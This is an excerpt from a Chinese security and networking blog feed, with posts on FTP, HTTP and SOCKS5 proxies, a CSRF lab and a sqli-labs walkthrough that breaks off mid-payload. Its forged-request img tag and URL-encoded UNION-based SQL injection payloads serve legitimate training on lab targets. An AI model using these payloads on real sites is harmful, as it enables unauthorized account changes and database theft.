    <content type="html"><![CDATA[<p>FTP基于C&#x2F;S架构，客户端和服务器之间会建立两条TCP连接，分别是控制连接和数据连接</p><h2 id="控制连接"><a href="#控制连接" class="headerlink" title="控制连接"></a>控制连接</h2><p>控制连接上的FTP报文是纯文本的，基于请求-响应模型。客户端发送请求，服务器返回响应</p><p>请求格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;命令&gt; &lt;参数&gt;\r\n<br></code></pre></td></tr></table></figure><p>\r\n用于标识一个FTP请求报文的结束</p><p>例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">USER xxx\r\n:发送用户名<br>PASS xxx\r\n:发送密码<br>LIST\r\n:列出当前目录下的文件和目录<br>PASV\r\n:切换到被动模式<br>TYPE I\r\n:切换到binary模式<br>PORT 192,168,163,103,143,127\r\n:客户端给出主动模式下的数据连接监听端口<br>PASV\r\n:通知服务器本次数据连接采用被动模式<br></code></pre></td></tr></table></figure><p>响应格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;响应码&gt; &lt;说明文字&gt;\r\n<br></code></pre></td></tr></table></figure><p>例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">331 Please specify the password.\r\n<br>230 Login successful.\r\n<br>227 Entering Passive Mode (192,168,163,105,208,45).\r\n:服务器给出被动模式下的监听端口<br></code></pre></td></tr></table></figure><p>更多关于控制连接报文格式的信息，参考RFC文档</p><p><a href="https://datatracker.ietf.org/doc/html/rfc959">https://datatracker.ietf.org/doc/html/rfc959</a></p><h2 id="数据连接"><a href="#数据连接" class="headerlink" title="数据连接"></a>数据连接</h2><p>数据连接直接传输文件的<code>字节流</code>，没有报文格式</p><h3 id="binary-ascii模式"><a href="#binary-ascii模式" class="headerlink" title="binary&#x2F;ascii模式"></a>binary&#x2F;ascii模式</h3><p>但数据连接有两个模式，binary和ascii模式</p><p>数据连接的主被动模式是针对数据连接的建立方式而言，这里不阐述，可以参考我的另一篇文章 <a href="https://www.pasiphae.top/2023/10/30/FTP%E4%B8%BB%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/">FTP主被动模式与抓包分析</a></p><p>binary模式直接传输文件的字节流，不做任何处理</p><p>ascii模式用于处理不同操作系统的换行符的差异，举个例子</p><p>假设是客户端处于windows下，服务器处于linux下。客户端下载文件，服务器会将发出的字节流中的<code>\n</code>转换为<code>\r\n</code>。客户端上传文件，服务器会将收到的字节流中<code>\r\n</code>转换为<code>\n</code>。也就是说，其实换行符的转换都是服务器在操作</p><h4 id="如何切换模式"><a href="#如何切换模式" class="headerlink" title="如何切换模式"></a>如何切换模式</h4><p>在FTP客户端上输入ascii或binary即可，客户端会记住你选择的模式。如果你不指定模式，一般FTP客户端默认都是binary模式</p><p>客户端在每次要上传或下载文件时，都会在控制连接上自动在控制连接上发出请求<code>TYPE I</code>(binary模式)或<code>TYPE A</code>(ascii模式)通知服务器本次数据连接的模式</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>3D太阳系</title>
    <link href="/2023/10/26/3DSolarSystem/"/>
    <url>/2023/10/26/3DSolarSystem/</url>
    
    <content type="html"><![CDATA[<!DOCTYPE html><html lang="zh"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="refresh" content="0;url=/3DSolarSystem/">    <title>跳转中...</title></head><body>    <p>如果没有自动跳转，请点击<a href="/3DSolarSystem/">这里</a></p></body></html>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RSA算法详解</title>
    <link href="/2023/07/29/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/"/>
    <url>/2023/07/29/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>该文章修改中…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HTTP(S)、SOCKS5代理原理详解</title>
    <link href="/2023/07/21/HTTP-S-%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/"/>
    <url>/2023/07/21/HTTP-S-%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="一、HTTP-S-代理"><a href="#一、HTTP-S-代理" class="headerlink" title="一、HTTP(S)代理"></a>一、HTTP(S)代理</h2><p>首先，我们要清楚，<code>HTTP代理</code>一词中的<code>HTTP</code>指的是客户端和代理服务器之间正式的应用层消息转发前进行协商使用的协议。HTTPS代理严格来说并不存在，只是TLS消息也可以走HTTP代理</p><p>我们通过WireShark抓帧来分析HTTP代理的原理，这里我们使用到开源软件<code>goproxy</code>，GitHub地址<a href="https://github.com/snail007/goproxy">https://github.com/snail007/goproxy</a>，它可以作为HTTP、SOCKS5代理，同时其还有很多有关计算机网络的强大功能</p><p>1.网络拓扑图<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/10.png" alt="这里有一个图片"></p><p>2.我们在192.168.163.103(后文省略为103，充当HTTP代理服务器)上开启WireShark，捕获IP为103对应的网络适配器的流量<br><code>sudo wireshark</code></p><p>3.在103的8080端口启动HTTP代理服务器<br><code>proxy http --local-type tcp --local 192.168.163.103:8080</code></p><p>4.在192.168.163.101(后文省略为101，充当客户端)上输入<br><code>curl --proxy http://192.168.163.103:8080 http://httpforever.com/</code><br>等待HTML的内容输出到终端<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/2.png" alt="这里有一个图片"></p><p>5.在103的WireShark过滤栏上输入<br><code>((ip.src == 192.168.163.101 and  ip.dst == 192.168.163.103) or (ip.src == 192.168.163.103 and  ip.dst == 192.168.163.101)) or ((ip.src == 192.168.163.103 and  ip.dst == 146.190.62.39) or (ip.src == 146.190.62.39 and  ip.dst == 192.168.163.103))</code><br>这样，就能过滤出103-101和103-146.190.62.39(httpforever.com的IP地址，后文省略为39)之间的帧<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/3.png" alt="这里有一个图片"></p><p>6.分析捕获到的帧<br>首先是101和103之间进行的TCP三次握手，101和103建立起TCP连接</p><p>然后101发送给103一个HTTP消息<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/4.png" alt="这里有一个图片"><br>在一般HTTP消息的红框部分本应该是不包含协议、域名、端口的URL，如下图<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/5.png" alt="这里有一个图片"><br>但这里URL是完整的，此处的<code>http://httpforever.com/</code>被称为absolute URI</p><p>当这个HTTP请求被代理服务器接收后，代理服务器通过DNS解析得到httpforever.com的IP地址，然后也通过TCP三次握手，建立起103和39之间的TCP连接(一般来说，代理服务器的IP应该是公网IP，这样才能起到掩盖客户端真实公网IP的作用。但我们这里是分析HTTP代理的原理，所以给代理服务器的是私有IP)<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/6.png" alt="这里有一个图片"></p><p>代理服务器将收到的HTTP消息的absolute URI部分更改为不带协议、域名、端口的URL，此处也就是<code>/</code>，其余地方不变，发送给39。39返回响应消息给103，103将其转发给101<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/7.png" alt="这里有一个图片"><br>在上图中我有一个尚未解决的问题，网络适配器设置以太帧的mtu最大为1500，帧的长度大约1518，但捕获到的帧中有些完全超出了1518。我怀疑其可能和网络适配器为虚拟网络适配器有关</p><p>后面的帧就是与101和103、103和39之间的四次挥手有关<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/8.png" alt="这里有一个图片"></p><p>下面我们通过抓帧分析TLS消息是否也能走HTTP代理<br>1.让103上的WireShark重新捕获帧</p><p>2.在101上输入<br><code>curl --proxy http://192.168.163.103 https://www.zhihu.com/</code><br>注意此时的协议为<code>HTTPS</code><br>后面的帧就是与101和103、103和39之间的四次挥手有关<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/11.png" alt="这里有一个图片"></p><p>3.分析捕获到的帧<br>在过滤栏输入<br><code>((ip.src == 192.168.163.103 and ip.dst == 192.168.163.101) or (ip.src == 192.168.163.101 and ip.dst == 192.168.163.103)) or ((ip.src == 192.168.163.103 and ip.dst == 182.131.24.233) or (ip.src ==  182.131.24.233 and ip.dst == 192.168.163.103))</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/12.png" alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/13.png" alt="这里有一个图片"></p><p>同样，首先是101和103的三次握手</p><p>然后101给103发送了一个HTTP请求，该请求的请求方法为<code>CONNECT</code>，同时后面跟着<code>域名:端口</code>。代理服务器进行DNS解析，获取域名对应的IP，然后建立103和182.131.24.233(后面省略为233)之间的TCP连接<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/9.png" alt="这里有一个图片"></p><p>如果代理服务器和待访问服务器之间的TCP连接建立成功，那么103会给101发送一个请求行中包含<code>connection established</code>的响应。如果TCP连接建立失败，则不会发送<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/HTTP%E3%80%81SOCKS5%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/14.png" alt="这里有一个图片"></p><p>客户端收到来自代理服务器的响应消息，便直接将TLS握手消息发送给代理服务器，代理服务器不做任何处理直接转发给待访问服务器。待访问服务器的响应经代理服务器之手不做任何修改转发给客户端。此时就好像客户端和待访问服务器之间的代理服务器不存在一样，就好像客户端和待访问服务器之间建立了一条隧道</p><p>因为HTTPS的对称加密的密钥是通过公钥加密得到的，代理服务器也无法获取对称加密的密钥，进而无法获取HTTPS的未加密内容</p><h2 id="二、SOCKS5代理"><a href="#二、SOCKS5代理" class="headerlink" title="二、SOCKS5代理"></a>二、SOCKS5代理</h2><p>SOCKS5是一个应用层协议，用于在客户端和代理服务器之间进行协商</p><p>客户端首先建立与SOCKS5代理服务器的TCP连接，在TCP连接上双方基于SOCKS5协议进行协商。协商内容包括客户端是否有使用该代理服务器的权限、客户端待访问的服务器的域名或IP和端口</p><p>之后代理服务器建立与待访问服务器之间的TCP连接，连接建立成功则代理服务器通过SOCKS5协议告知客户端可以开始发送报文。此时，就好像客户端和待访问服务器之间建立了一条隧道</p><p>SOCKS5协议的内容可以参考<a href="https://jiajunhuang.com/articles/2019_06_06-socks5.md.html">https://jiajunhuang.com/articles/2019_06_06-socks5.md.html</a><br>关于SOCK5的WireShark抓帧分析暂时就不写了，以后可能会补上</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSRF原理详解</title>
    <link href="/2022/12/12/CSRF%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/12/12/CSRF%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p>CSRF，Cross Sites Request Forgery，跨站请求伪造，发生在两个网站之间。一个网站是黑客的钓鱼网站，一个是受害者在浏览器上<strong>已登录</strong>的具有会话cookie的网站</p><p>简单例子<br>假如一家银行用以执行转账操作的URL地址如下 <code>https://bank.example.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName</code></p><p>那么，一个恶意攻击者可以在另一个网站上放上<br><code>&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amp;amount=1000&amp;amp;for=Badman&quot; /&gt;</code></p><p>如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000资金</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险</p><p>透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户的浏览器，让其以用户的名义执行操作</p><h2 id="二、以具体实验分析原理"><a href="#二、以具体实验分析原理" class="headerlink" title="二、以具体实验分析原理"></a>二、以具体实验分析原理</h2><p>这里我们以一个实验分析CSRF的原理</p><h3 id="1-书店系统搭建"><a href="#1-书店系统搭建" class="headerlink" title="1.书店系统搭建"></a>1.书店系统搭建</h3><p>首先在192.168.163.103上基于nginx搭建一个BookstoreSystem<br>项目地址<a href="https://github.com/pasiphae321/BookstoreSystem">https://github.com/pasiphae321/BookstoreSystem</a></p><p>在192.168.163.101上基于nginx搭建一个钓鱼网站，其上有个网页test.html内容如下<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/3.png" alt="这里有一个图片"></p><p>在192.168.163.1(后文省略为1，假设为受害者主机)上，修改本地的DNS文件，win11的路径为<code>C:\Windows\System32\drivers\etc\hosts</code><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/1.png" alt="这里有一个图片"></p><p>在1的浏览器上访问<code>http://test.pasiphae.net/BookstoreSystem/login.php</code>，以<code>what/cccccc</code>进行登录<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/2.png" alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/4.png" alt="这里有一个图片"><br>成功登录进去了</p><h3 id="2-Cookie的SameSite属性"><a href="#2-Cookie的SameSite属性" class="headerlink" title="2.Cookie的SameSite属性"></a>2.Cookie的SameSite属性</h3><p>Cookie的SameSite属性规定是否在跨站请求中携带该Cookie，SameSite属性有三个值</p><ul><li>Strict:所有的跨站请求都不携带Cookie，那么CSRF攻击将不存在</li><li>Lax:部分跨站请求携带Cookie</li><li>None:所有跨站请求都携带Cookie，不过此时需满足Secure属性为true，即该请求为HTTPS请求</li></ul><p>此时还要注意<strong>跨源</strong>和<strong>跨站</strong>的区别，可以参考我的文章<a href="https://www.pasiphae.top/2024/02/03/%E8%B7%A8%E6%BA%90%E4%B8%8E%E8%B7%A8%E7%AB%99%E3%80%81CORS%E3%80%81Cookie%E7%9A%84SameSite%E5%B1%9E%E6%80%A7%E6%B5%85%E6%9E%90/">跨源与跨站、CORS、Cookie的SameSite属性浅析</a></p><h4 id="Lax"><a href="#Lax" class="headerlink" title="Lax"></a>Lax</h4><p>因为此时Cookie的SameSite属性为<strong>Lax</strong>，那么只有下图中的前三项会在跨站请求中携带Cookie<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E8%B7%A8%E6%BA%90%E4%B8%8E%E8%B7%A8%E7%AB%99%E3%80%81CORS%E3%80%81Cookie%E7%9A%84SameSite%E5%B1%9E%E6%80%A7%E6%B5%85%E6%9E%90/1.png" alt="这里有一个图片"></p><h5 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h5><p>此时，受害者没有关闭浏览器，其test.pasiphae.net的会话cookie还未消失。他此时访问了<code>www.pasiphae.com/test.html</code>，点击了领取礼包的超链接。虽然此时属于跨站，同时属于跨源，但跨站的Lax如上图所示在超链接情况下会携带cookie，跨源但属于简单跨源请求，不会进行CORS预检</p><p>那么，携带会话cookie的请求就会被发送，what用户的密码就会被从<code>cccccc</code>修改为<code>1894787</code><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/5.png" alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/6.png" alt="这里有一个图片"><br>可以看到，what的密码确实被修改为了<code>1894787</code></p><h5 id="GET表单"><a href="#GET表单" class="headerlink" title="GET表单"></a>GET表单</h5><p>将<code>www.pasiphae.com/test.html</code>更改成一个GET表单<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/12.png" alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/13.png" alt="这里有一个图片"></p><p>重新登录what<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/14.png" alt="这里有一个图片"></p><p>受害者填写了收货信息并点击提交<br>此时的跨站请求也携带了会话Cookie，密码被修改<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/15.png" alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/16.png" alt="这里有一个图片"></p><h5 id="POST表单"><a href="#POST表单" class="headerlink" title="POST表单"></a>POST表单</h5><p>将<code>www.pasiphae.com/test.html</code>更改成一个POST表单<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/17.png" alt="这里有一个图片"></p><p>重新登录what<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/18.png" alt="这里有一个图片"></p><p>受害者填写收获信息并点击提交<br>POST表单确实不会携带上Cookie，这和上面的那个表格相吻合<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/19.png" alt="这里有一个图片"></p><h4 id="Strict"><a href="#Strict" class="headerlink" title="Strict"></a>Strict</h4><p>我们在test.pasiphae.net的后端，将SameSite属性设置为<strong>Strict</strong>，那么此时点击链接发送的请求不会再包含cookie，下面我们进行验证<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/7.png" alt="这里有一个图片"><br>在<a href="http://www.neptune.com上将test.html修改下/">www.neptune.com上将test.html修改下</a><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/9.png" alt="这里有一个图片"></p><p>我们对此进行验证<br>重新登录what<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/8.png" alt="这里有一个图片"><br>会话cookie跟刚才肯定是不一样的</p><p>这次就没有携带cookie了，所以也就修改不了密码<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/10.png" alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/CSRF%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/11.png" alt="这里有一个图片"></p><p>同样，GET表单和POST表单也不会携带cookie，这里就不作验证了</p><h4 id="None"><a href="#None" class="headerlink" title="None"></a>None</h4><p>因为None需要结合https使用，这里暂时不做验证</p><h2 id="三、防范CSRF攻击措施"><a href="#三、防范CSRF攻击措施" class="headerlink" title="三、防范CSRF攻击措施"></a>三、防范CSRF攻击措施</h2><h3 id="1-令牌同步模式"><a href="#1-令牌同步模式" class="headerlink" title="1.令牌同步模式"></a>1.令牌同步模式</h3><p>令牌同步模式(Synchronizer token pattern，简称STP)<br>原理是，当用户发送请求时，服务器端应用将令牌(token，一个保密且唯一的值)嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性(如：使用随机种子的哈希链 )。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证</p><p>STP能在HTML下运作顺利，但会导致服务端的复杂度升高，复杂度源于令牌的生成和验证。因为令牌是唯一且随机，如果每个表格都使用一个唯一的令牌，那么当页面过多时，服务器由于生产令牌而导致的负担也会增加。而使用会话等级的令牌代替的话，服务器的负担将没有那么重</p><h3 id="2-检查Referer字段"><a href="#2-检查Referer字段" class="headerlink" title="2.检查Referer字段"></a>2.检查Referer字段</h3><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于bank.example.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于bank.example.com之下，这时候服务器就能识别出恶意的访问</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能</p><h3 id="3-添加校验token"><a href="#3-添加校验token" class="headerlink" title="3.添加校验token"></a>3.添加校验token</h3><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求</p><h3 id="4-设置会话Cookie的SameSite属性为Strict"><a href="#4-设置会话Cookie的SameSite属性为Strict" class="headerlink" title="4.设置会话Cookie的SameSite属性为Strict"></a>4.设置会话Cookie的SameSite属性为Strict</h3><p>此时任何跨站请求都不会携带会话Cookie，CSRF攻击也就不存在了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs过关</title>
    <link href="/2022/11/20/sqli-labs%E8%BF%87%E5%85%B3/"/>
    <url>/2022/11/20/sqli-labs%E8%BF%87%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<p>关于sqli-labs靶场的搭建，可以参阅我的另一篇文章 <a href="https://www.pasiphae.top/2022/11/09/ubuntu%E4%B8%8Bsqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">ubuntu下sqli-labs靶场搭建</a></p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/1.png" alt="这里有一个图片"></p><p>提示我们带参数ID，但试了1、2、3都不行，发现是小写的id，这提示有点抽象</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/2.png" alt="这里有一个图片"></p><h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p><code>#注释</code>仅适用于mysql和sqlite，构造<code>1;#123</code>并进行URL编码</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/3.png" alt="这里有一个图片"></p><p>最终的payload为<code>?id=1%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/4.png" alt="这里有一个图片"></p><p>上图成功输出用户名和密码说明<code>#注释</code>能用</p><p>&nbsp;</p><p>接着判断是mysql还是sqlite</p><p>mysql中字符串拼接可用<code>&#39;ab&#39; + &#39;cd&#39; = &#39;abcd&#39;</code>，但sqlite中不能</p><p>构造<code>1 and &#39;ab&#39; + &#39;cd&#39; = &#39;abcd&#39;;#123</code>并进行URL编码</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/5.png" alt="这里有一个图片"></p><p>最终payload为<code>?id=1%20and%20%27ab%27%20%2B%20%27cd%27%20%3D%20%27abcd%27%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/6.png" alt="这里有一个图片"></p><p>数据库居然报错了，当然可以直接从报错信息得出数据库管理系统为mysql，但是一般服务器都不会将报错信息回送给客户端的，只会显示诸如<code>搜索结果为空</code>或直接置空之类的</p><p>&nbsp;</p><p>它这里的报错信息让我百思不得其解，直接查看源码，发现它居然在SQL语句中给id字段加单引号，但在mysql中其数据类型为int。虽然mysql会自动进行数据类型转换，但这个代码编写得确实很有瑕疵</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/7.png" alt="这里有一个图片"></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/8.png" alt="这里有一个图片"></p><p>&nbsp;</p><p>那我们将payload修改为<code>1&#39; &#39;ab&#39; + &#39;cd&#39; = &#39;abcd&#39;;#123</code>，并进行URL编码</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/9.png" alt="这里有一个图片"></p><p>最终的payload为<code>1%27%20and%20%27ab%27%20%2B%20%27cd%27%20%3D%20%27abcd%27%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/10.png" alt="这里有一个图片"></p><p>成功显示出用户名密码，说明数据库为mysql</p><h3 id="字段数量查询"><a href="#字段数量查询" class="headerlink" title="字段数量查询"></a>字段数量查询</h3><p>查询当前使用的表有多少个字段</p><p>是两个吗？<code>-2&#39; union select 1,2;#123</code></p><p>URL编码<code>%2D2%27%20union%20select%201%2C2%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/11.png" alt="这里有一个图片"></p><p>不是两个</p><p>&nbsp;</p><p>是三个吗？<code>-2&#39; union select 1,2,3;#123</code></p><p>URL编码<code>%2D2%27%20union%20select%201%2C2%2C3%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/12.png" alt="这里有一个图片"></p><p>是三个，且显示在浏览器的是第二个和第三个字段</p><h3 id="爆出所有库名"><a href="#爆出所有库名" class="headerlink" title="爆出所有库名"></a>爆出所有库名</h3><p><code>-2&#39; union select 1, GROUP_CONCAT(distinct TABLE_SCHEMA), 3 from information_schema.COLUMNS;#123</code></p><p>URL编码<code>%2D2%27%20union%20select%201%2C%20GROUP%5FCONCAT%28distinct%20TABLE%5FSCHEMA%29%2C%203%20from%20information%5Fschema%2ECOLUMNS%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/13.png" alt="这里有一个图片"></p><h3 id="爆出所有表名"><a href="#爆出所有表名" class="headerlink" title="爆出所有表名"></a>爆出所有表名</h3><p>爆出security库的所有表名</p><p><code>-2&#39; union select 1, GROUP_CONCAT(distinct TABLE_NAME), 3 from information_schema.COLUMNS where TABLE_SCHEMA = 